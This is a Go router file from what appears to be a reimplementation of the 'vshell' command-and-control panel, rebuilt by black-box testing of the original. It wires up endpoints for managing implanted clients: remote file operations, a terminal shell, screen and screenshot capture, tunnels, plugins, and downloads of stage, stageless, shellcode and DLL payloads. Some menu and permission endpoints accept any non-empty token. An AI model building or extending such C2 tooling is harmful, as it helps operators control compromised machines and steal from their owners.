// Package router registers the HTTP routes exposed by this implementation.
//
// Route paths are cross-checked against frontend references and reverse-
// engineering notes, but that alone does not establish complete parity with
// the original binary. Authentication behavior depends on each controller's
// preparation and handler logic; review those paths before assuming a route
// is protected. Do not treat this package comment as a security guarantee.
package router

import (
	"crypto/subtle"
	"encoding/json"
	"log"
	"net/http"
	"os"
	"path/filepath"
	"strings"
	"sync"

	"vshell/controllers"
	"vshell/utils"

	beego "github.com/beego/beego/v2/server/web"
)

var apiOnce sync.Once

// registerAPIRoutes registers routes identified in the current frontend and
// reverse-engineering notes. These references help locate candidate endpoints,
// but each route and handler still requires behavioral verification.
func registerAPIRoutes() {
	apiOnce.Do(func() {
		// 登录
		beego.Router("/api/login", &controllers.LoginController{}, "post:Login")
		beego.Router("/api/logout", &controllers.LoginController{}, "get:Logout;post:Logout")

		// 仪表盘
		beego.Router("/api/dashboard/info", &controllers.DashboardController{}, "get:Info")

		// 客户端
		beego.Router("/api/client/list", &controllers.ClientController{}, "post:List")
		beego.Router("/api/client/add", &controllers.ClientController{}, "post:Add")
		beego.Router("/api/client/editremark", &controllers.ClientController{}, "post:EditRemark")
		beego.Router("/api/client/delfile", &controllers.ClientController{}, "post:DelFile")
		beego.Router("/api/client/delprocess", &controllers.ClientController{}, "post:DelProcess")
		beego.Router("/api/client/dellist", &controllers.ClientController{}, "post:DelList")

		// 监听器
		beego.Router("/api/listener/list", &controllers.ListenerController{}, "post:List")
		beego.Router("/api/listener/add", &controllers.ListenerController{}, "post:Add")
		beego.Router("/api/listener/edit", &controllers.ListenerController{}, "post:Edit")
		beego.Router("/api/listener/editremark", &controllers.ListenerController{}, "post:EditRemark")
		beego.Router("/api/listener/del", &controllers.ListenerController{}, "post:Del")
		beego.Router("/api/listener/dellist", &controllers.ListenerController{}, "post:DelList")
		beego.Router("/api/listener/start", &controllers.ListenerController{}, "post:Start")
		beego.Router("/api/listener/stop", &controllers.ListenerController{}, "post:Stop")

		// 隧道
		beego.Router("/api/tunnel/list", &controllers.TunnelController{}, "post:List")
		beego.Router("/api/tunnel/add", &controllers.TunnelController{}, "post:Add")
		beego.Router("/api/tunnel/edit", &controllers.TunnelController{}, "post:Edit")
		beego.Router("/api/tunnel/editremark", &controllers.TunnelController{}, "post:EditRemark")
		beego.Router("/api/tunnel/del", &controllers.TunnelController{}, "post:Del")
		beego.Router("/api/tunnel/dellist", &controllers.TunnelController{}, "post:DelList")
		beego.Router("/api/tunnel/start", &controllers.TunnelController{}, "post:Start")
		beego.Router("/api/tunnel/stop", &controllers.TunnelController{}, "post:Stop")

		// 文件
		beego.Router("/api/file/getdisk", &controllers.FileController{}, "post:Getdisk")
		beego.Router("/api/file/ls", &controllers.FileController{}, "post:Ls")
		beego.Router("/api/file/mv", &controllers.FileController{}, "post:Mv")
		beego.Router("/api/file/rm", &controllers.FileController{}, "post:Rm")
		beego.Router("/api/file/rmlist", &controllers.FileController{}, "post:RmList")
		beego.Router("/api/file/cat", &controllers.FileController{}, "post:Cat")
		beego.Router("/api/file/touch", &controllers.FileController{}, "post:Touch")
		beego.Router("/api/file/modifytime", &controllers.FileController{}, "post:Modifytime")
		beego.Router("/api/file/mkdir", &controllers.FileController{}, "post:Mkdir")
		beego.Router("/api/file/edit", &controllers.FileController{}, "post:Edit")
		beego.Router("/api/file/wget", &controllers.FileController{}, "post:Wget")
		beego.Router("/api/file/upload", &controllers.FileController{}, "post:Upload")
		beego.Router("/api/file/downloadtoserver", &controllers.FileController{}, "post:DownloadToServer")
		beego.Router("/api/file/getdownloadper", &controllers.FileController{}, "post:GetDownloadPer")
		beego.Router("/api/file/downloadtobrowser", &controllers.FileController{}, "get:DownloadToBrowser;post:DownloadToBrowser")
		beego.Router("/api/file/downloadtooss", &controllers.FileController{}, "post:DownloadToOSS")

		// 载荷下载
		beego.Router("/api/download/stage", &controllers.DownloadController{}, "get:Stage;post:Stage")
		beego.Router("/api/download/stageless", &controllers.DownloadController{}, "get:Stageless;post:Stageless")
		beego.Router("/api/download/listen", &controllers.DownloadController{}, "get:Listen;post:Listen")
		beego.Router("/api/download/shellcode", &controllers.DownloadController{}, "get:Shellcode;post:Shellcode")
		beego.Router("/api/download/dll", &controllers.DownloadController{}, "get:Dll;post:Dll")
		beego.Router("/api/download/listendll", &controllers.DownloadController{}, "get:ListenDll;post:ListenDll")

		// 安装
		beego.Router("/api/install/install", &controllers.InstallController{}, "post:Install")
		beego.Router("/api/install/remove", &controllers.InstallController{}, "post:Remove")

		// 插件
		beego.Router("/api/runner/list", &controllers.RunnerController{}, "get:List")
		beego.Router("/api/runner/runplugin", &controllers.RunnerController{}, "post:RunPlugin")
		beego.Router("/api/runner/upload", &controllers.RunnerController{}, "post:Upload")

		// 设置
		beego.Router("/api/setting/edit", &controllers.SettingController{}, "post:Edit")
		beego.Router("/api/setting/get", &controllers.SettingController{}, "get:Get")

		// 终端 / 屏幕（WebSocket）
		//
		// 这两条路由不走 beego：SPA 的 WebSocket 端点由控制器直接 Hijack 连接
		// （upgrade + 双向转发），而 beego 在控制器方法返回后会继续渲染视图——
		// 内嵌的 SPA 是前端资源而非模板，于是必然抛 "Unknown view path:views"
		// 并接管（已被劫持的）响应。注册为 net/http 处理器后，升级由
		// registerStreamWSRoutes 直接完成，控制器方法只负责会话逻辑。
		//
		// Terminal / screen WebSocket endpoints are registered as net/http
		// handlers rather than beego routes: the handler hijacks the connection,
		// and beego would afterwards try to render a view for the (already
		// hijacked) response and fail with "Unknown view path:views".
		//
		// 终端（单发命令，POST）—— /api/terminal/ws 与 /api/screen/ws 见下方
		// registerStreamWSRoutes。
		beego.Router("/api/terminal/shell", &controllers.TerminalController{}, "post:Shell")

		// 截图
		beego.Router("/api/screenshot/get", &controllers.ScreenshotController{}, "get:Get")
	})
}

// InitRouter 初始化全部路由。
// InitRouter initializes all routes.
func InitRouter() http.Handler {
	beego.BConfig.CopyRequestBody = true // 保留 JSON 请求体供参数读取
	registerAPIRoutes()

	mux := http.NewServeMux()

	// 静态资源：按文件精确匹配（原版 4.9.3 黑盒：未知路径一律 404，没有 SPA 回退；
	// GET / → 302 /index.html；/assets/xxx 不存在 → 404）。
	mux.HandleFunc("/", func(w http.ResponseWriter, r *http.Request) {
		p := r.URL.Path
		if strings.HasPrefix(p, "/api/") || strings.HasPrefix(p, "/c2/") {
			http.NotFound(w, r)
			return
		}
		if p == "/" {
			http.Redirect(w, r, "/index.html", http.StatusFound)
			return
		}
		// 只服务真实存在的静态文件（禁止 .. 穿越：Clean 后拼到 static/ 下）。
		clean := filepath.Clean("/" + p)
		full := filepath.Join("static", clean)
		if st, err := os.Stat(full); err != nil || st.IsDir() {
			http.NotFound(w, r)
			return
		}
		// 用 ServeContent 而不是 http.FileServer：后者会把 /index.html 301 重定向到 /，
		// 而原版是直接 200 返回 shell（黑盒实测）。
		f, err := os.Open(full)
		if err != nil {
			http.NotFound(w, r)
			return
		}
		defer f.Close()
		info, err := f.Stat()
		if err != nil {
			http.NotFound(w, r)
			return
		}
		switch {
		case strings.HasSuffix(p, ".js"):
			w.Header().Set("Content-Type", "application/javascript; charset=utf-8")
		case strings.HasSuffix(p, ".css"):
			w.Header().Set("Content-Type", "text/css; charset=utf-8")
		}
		http.ServeContent(w, r, info.Name(), info.ModTime(), f)
	})

	// 新版 Vue3 面板（web2/dist 优先，回落到 web/dist）。与提取的原版 SPA（static/）并存：
	// /app/ → web2/dist（Ant Design Vue 版，对齐 4.9.3 技术栈）；不带结尾斜杠时 301 到 /app/。
	mux.HandleFunc("/app", func(w http.ResponseWriter, r *http.Request) {
		http.Redirect(w, r, "/app/", http.StatusMovedPermanently)
	})
	mux.HandleFunc("/app/", serveVueApp(frontendDir()))

	// 用户信息 / 菜单 / 权限码（黑盒验证的原版响应格式）
	mux.HandleFunc("/api/getUserInfo", handleGetUserInfo)
	mux.HandleFunc("/api/getMenuList", handleGetMenuList)
	mux.HandleFunc("/api/getPermCode", handleGetPermCode)

	// beego API 控制器（真实路由）
	mux.Handle("/api/", beego.BeeApp.Handlers)

	// 面板查看者 WebSocket（终端 / 屏幕）：beego 无法承载 Hijack，见
	// registerAPIRoutes 的说明。
	registerStreamWSRoutes(mux)

	// C2 Agent 协议端点
	registerC2AgentRoutes(mux)

	// 原版 web_basic_auth=true 时，静态资源（/、/favicon.ico、/index.html…）要求
	// HTTP Basic；/api/* 不受保护（黑盒：无 Basic 的 /api/getUserInfo 仍 200）。
	var handler http.Handler = mux
	if cfg := utils.GetFullSettings(); cfg != nil && cfg.WebBasicAuth {
		handler = basicAuthMiddleware(handler, cfg.WebUsername, cfg.WebPassword)
	}
	return handler
}

// basicAuthMiddleware 为静态资源加 HTTP Basic 认证。
//
// 黑盒（原版 4.9.3，web_basic_auth=true）：
//
//	GET /            无凭证 -> 401 + WWW-Authenticate: Basic realm="Authorization Required"
//	                           body "401 Unauthorized\n"（17 字节）
//	GET /favicon.ico 无凭证 -> 401；带正确凭证 -> 200
//	GET /api/*       无凭证 -> 正常响应（不受保护）
//
// 401 的 realm 文案与 body 逐字对齐，便于指纹对照与前端处理。
func basicAuthMiddleware(next http.Handler, user, pass string) http.Handler {
	return http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		if !isProtectedStatic(r.URL.Path) {
			next.ServeHTTP(w, r)
			return
		}
		u, p, ok := r.BasicAuth()
		if ok && subtleCompare(u, user) && subtleCompare(p, pass) {
			next.ServeHTTP(w, r)
			return
		}
		w.Header().Set("WWW-Authenticate", `Basic realm="Authorization Required"`)
		w.Header().Set("Content-Type", "text/plain; charset=utf-8")
		w.WriteHeader(http.StatusUnauthorized)
		_, _ = w.Write([]byte("401 Unauthorized\n"))
	})
}

// isProtectedStatic 判断路径是否需要 HTTP Basic：
//
//	/api/*、/c2/*    → 不保护（原版面板 API 与 agent 端点都不走 Basic）
//	agent 端点族     → 不保护（/swt /sww /swk /sws /swd /swl /swld /health /ws）
//	/ 与真实存在的静态文件 → 保护
//	其它（未知路径） → 不保护，交给 mux 返回 404（黑盒：/login、/index6us 均 404 而非 401）
func isProtectedStatic(p string) bool {
	if strings.HasPrefix(p, "/api/") || strings.HasPrefix(p, "/c2/") {
		return false
	}
	switch p {
	case "/health", "/ws", "/swt", "/sww", "/swk", "/sws", "/swd", "/swl", "/swld":
		return false
	}
	if p == "/" || strings.HasPrefix(p, "/app/") || p == "/app" {
		// 新版面板同样受 web_basic_auth 保护（与原版静态资源一致）。
		return true
	}
	st, err := os.Stat(filepath.Join("static", filepath.Clean("/"+p)))
	return err == nil && !st.IsDir()
}

// subtleCompare 定时安全比较（避免用 == 泄露口令长度/内容前缀）。
func subtleCompare(a, b string) bool {
	return subtle.ConstantTimeCompare([]byte(a), []byte(b)) == 1
}

// frontendDir 返回要托管的前端产物目录：优先 web2/dist（Ant Design Vue 版），
// 没有再回落到 web/dist（旧 Element Plus 版），两个都不存在时仍按 web/dist 处理
// （后续请求会 404，日志里能看到）。
func frontendDir() string {
	for _, dir := range []string{"web2/dist", "web/dist"} {
		if _, err := os.Stat(filepath.Join(dir, "index.html")); err == nil {
			return dir
		}
	}
	return "web/dist"
}

// serveVueApp 托管新版面板的静态产物（web/dist），带 index.html 回退。
//
// 新版前端用 hash 路由（见 web/src/router/index.ts），因此回退只需覆盖直接访问
// /app/ 的情况；资源文件按精确路径匹配，找不到回退到 index.html（Vite 的 base
// 是 /app/，产物内部的引用也都是绝对路径）。
func serveVueApp(root string) http.HandlerFunc {
	indexPath := filepath.Join(root, "index.html")
	return func(w http.ResponseWriter, r *http.Request) {
		if _, err := os.Stat(indexPath); err != nil {
			http.NotFound(w, r)
			return
		}
		rel := strings.TrimPrefix(r.URL.Path, "/app/")
		if rel == "" {
			rel = "index.html"
		}
		full := filepath.Join(root, filepath.Clean("/"+rel))
		if st, err := os.Stat(full); err == nil && !st.IsDir() {
			http.ServeFile(w, r, full)
			return
		}
		http.ServeFile(w, r, indexPath)
	}
}

func extractToken(r *http.Request) string {
	if t := r.Header.Get("Token"); t != "" {
		return t
	}
	if auth := r.Header.Get("Authorization"); len(auth) > 7 && auth[:7] == "Bearer " {
		return auth[7:]
	}
	if t := r.Header.Get("X-Token"); t != "" {
		return t
	}
	return r.URL.Query().Get("token")
}

// registerStreamWSRoutes 注册面板查看者 WebSocket 端点。
// registerStreamWSRoutes registers the panel's viewer WebSocket endpoints.
//
// 认证复用 ApiBaseController.Prepare 的同一套 token 校验（Token 头 / token
// 查询串，见 controllers.CheckToken 与用户信息接口），校验失败返回 401 且
// 不升级连接；通过后由控制器完成升级与会话建立。
func registerStreamWSRoutes(mux *http.ServeMux) {
	mux.HandleFunc("/api/terminal/ws", func(w http.ResponseWriter, r *http.Request) {
		if !requireViewerToken(w, r) {
			return
		}
		controllers.ServeTerminalViewer(w, r)
	})
	mux.HandleFunc("/api/screen/ws", func(w http.ResponseWriter, r *http.Request) {
		if !requireViewerToken(w, r) {
			return
		}
		controllers.ServeScreenViewer(w, r)
	})
}

// requireViewerToken 校验查看者 token；失败时写 401 并返回 false。
// requireViewerToken enforces the panel token on a viewer WebSocket request.
func requireViewerToken(w http.ResponseWriter, r *http.Request) bool {
	token := extractToken(r)
	if token == "" || !controllers.CheckToken(token) {
		w.WriteHeader(http.StatusUnauthorized)
		return false
	}
	return true
}

// registerC2AgentRoutes 注册 C2 Agent 协议端点。
func registerC2AgentRoutes(mux *http.ServeMux) {
	// 黑盒验证（session 82）：/c2/l/* 全部 404——原版无 HTTP C2 端点。
	// 真实 agent 协议 = KCP/WS/DNS 传输 + checkin 文本命令
	// （"conf"/"host"/"stus"/"task" + JSON，FUN_016f3e80 实锤）。
	mux.HandleFunc("/c2/", func(w http.ResponseWriter, r *http.Request) {
		http.NotFound(w, r)
	})
}

func basePath(path string) string {
	parts := strings.Split(strings.Trim(path, "/"), "/")
	if len(parts) > 0 {
		return parts[0]
	}
	return ""
}

func handleGetUserInfo(w http.ResponseWriter, r *http.Request) {
	token := extractToken(r)

	if token == "" {
		http.Error(w, "", http.StatusUnauthorized)
		return
	}

	username, err := utils.ValidateToken(token)
	if err != nil {
		log.Printf("[getUserInfo] Invalid token: %v", err)
		// Original returns HTTP 200 with code 401 for an invalid token.
		w.Header().Set("Content-Type", "application/json; charset=utf-8")
		json.NewEncoder(w).Encode(map[string]interface{}{
			"code":   401,
			"result": nil,
		})
		return
	}

	w.Header().Set("Content-Type", "application/json; charset=utf-8")
	json.NewEncoder(w).Encode(utils.UserInfoResponse{
		Code:    0,
		Message: "ok",
		Type:    "success",
		Result: utils.UserInfo{
			Avatar:   "",
			UserID:   "1",
			Username: username,
			RealName: username,
			Desc:     "manager",
			HomePath: "/dashboard/index",
			Roles: []utils.RoleInfoResp{
				{RoleName: "Super Admin", Value: "super"},
			},
			Token: "",
		},
	})
}

func handleGetMenuList(w http.ResponseWriter, r *http.Request) {
	if extractToken(r) == "" {
		http.Error(w, "", http.StatusUnauthorized)
		return
	}
	w.Header().Set("Content-Type", "application/json; charset=utf-8")
	json.NewEncoder(w).Encode(map[string]interface{}{
		"code":    0,
		"message": "ok",
		"type":    "success",
		"result":  getDefaultMenuList(),
	})
}

func handleGetPermCode(w http.ResponseWriter, r *http.Request) {
	if extractToken(r) == "" {
		http.Error(w, "", http.StatusUnauthorized)
		return
	}
	w.Header().Set("Content-Type", "application/json; charset=utf-8")
	json.NewEncoder(w).Encode(map[string]interface{}{
		"code":    0,
		"message": "ok",
		"type":    "success",
		"result":  []string{"*"}, // super admin: all permissions
	})
}

func getDefaultMenuList() []map[string]interface{} {
	// NOTE: paths must match the compiled SPA routes (static route modules in
	// the embedded frontend), NOT guessed paths. The SPA's registered routes are
	// /dashboard/index, /client/list, /listener/list, /download/{index,stage,
	// stageless,listen,ebpf}, /pluginrunner/index, /tunnel/list, /setting/index,
	// /about/index, plus detail pages (/terminal/index, /filemanager/index,
	// /screen/index, /screenshot/index, /serviceInstall/index, /clientManager/
	// index). Previously this returned /client/index, /listener/index,
	// /file/index, /tunnel/index, /plugin/index and /host/index — routes the SPA
	// does NOT register — so any consumer building routes from this response
	// would resolve to the SPA's 404 catch-all.
	return []map[string]interface{}{
		{
			"name":      "Dashboard",
			"path":      "/dashboard/index",
			"icon":      "ion:grid-outline",
			"component": "LAYOUT",
			"children":  []map[string]interface{}{},
		},
		{
			"name":      "Clients",
			"path":      "/client/list",
			"icon":      "ion:people-outline",
			"component": "LAYOUT",
			"children":  []map[string]interface{}{},
		},
		{
			"name":      "Listeners",
			"path":      "/listener/list",
			"icon":      "ion:list-outline",
			"component": "LAYOUT",
			"children":  []map[string]interface{}{},
		},
		{
			"name":      "Terminal",
			"path":      "/terminal/index",
			"icon":      "ion:terminal-outline",
			"component": "LAYOUT",
			"children":  []map[string]interface{}{},
		},
		{
			"name":      "Files",
			"path":      "/filemanager/index",
			"icon":      "ion:folder-outline",
			"component": "LAYOUT",
			"children":  []map[string]interface{}{},
		},
		{
			"name":      "Tunnels",
			"path":      "/tunnel/list",
			"icon":      "ion:git-network-outline",
			"component": "LAYOUT",
			"children":  []map[string]interface{}{},
		},
		{
			"name":      "Downloads",
			"path":      "/download/index",
			"icon":      "ion:download-outline",
			"component": "LAYOUT",
			"children": []map[string]interface{}{
				{"name": "Stage", "path": "/download/stage", "icon": ""},
				{"name": "Stageless", "path": "/download/stageless", "icon": ""},
				{"name": "Listen", "path": "/download/listen", "icon": ""},
				{"name": "Ebpf", "path": "/download/ebpf", "icon": ""},
			},
		},
		{
			"name":      "Plugins",
			"path":      "/pluginrunner/index",
			"icon":      "ion:extension-puzzle-outline",
			"component": "LAYOUT",
			"children":  []map[string]interface{}{},
		},
		{
			"name":      "Screenshot",
			"path":      "/screenshot/index",
			"icon":      "ion:camera-outline",
			"component": "LAYOUT",
			"children":  []map[string]interface{}{},
		},
		{
			"name":      "Settings",
			"path":      "/setting/index",
			"icon":      "ion:settings-outline",
			"component": "LAYOUT",
			"children":  []map[string]interface{}{},
		},
		{
			"name":      "About",
			"path":      "/about/index",
			"icon":      "ion:information-circle-outline",
			"component": "LAYOUT",
			"children":  []map[string]interface{}{},
		},
	}
}
